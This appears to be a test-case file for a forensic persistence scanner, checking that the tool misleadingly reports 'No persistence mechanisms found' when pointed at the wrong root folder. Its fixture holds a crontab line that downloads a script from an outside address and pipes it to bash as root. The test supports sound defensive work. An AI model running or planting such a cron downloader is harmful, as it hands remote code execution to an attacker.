@@ -1,0 +1,32 @@
+# Matrix case P4118-006: find_persistence reports "No persistence mechanisms
+# found" even when none of the scanned directories (etc, var/spool, home ...)
+# exist under root_path. Here root_path is one level above the real fs root,
+# which holds a cron downloader, so the scan looks at nothing.
+case_id: P4118-006
+problem: P4118
+server: findevil
+variant: findevil-d1a8d25
+commit: d1a8d25d9c8c05bd66881506cb1f12314ee7c5e1
+display: response
+level: mcp
+realism: common
+coverage: full
+summary: When root_path is the case folder instead of its fs/ subfolder, so no etc/ or other scanned directory exists under it, find_persistence answers "No persistence mechanisms found under ..." without saying nothing was scanned, while the fs/ root below holds a cron job that downloads and runs a script.
+fixture:
+  - path: case/fs/etc/crontab
+    text: "* * * * * root curl -s http://203.0.113.7/x.sh | bash\n"
+steps:
+  - tool: find_persistence
+    args:
+      root_path: ${EVIDENCE}/case
+  - tool: find_persistence
+    args:
+      root_path: ${EVIDENCE}/case/fs
+expect:
+  - step: 1
+    contains: "No persistence mechanisms found under"
+  - step: 1
+    not_regex: "(?i)not found|no etc|does not look like|not a filesystem root|nothing (was )?scanned"
+  # control: the same evidence one level down is flagged
+  - step: 2
+    contains: "etc/crontab"
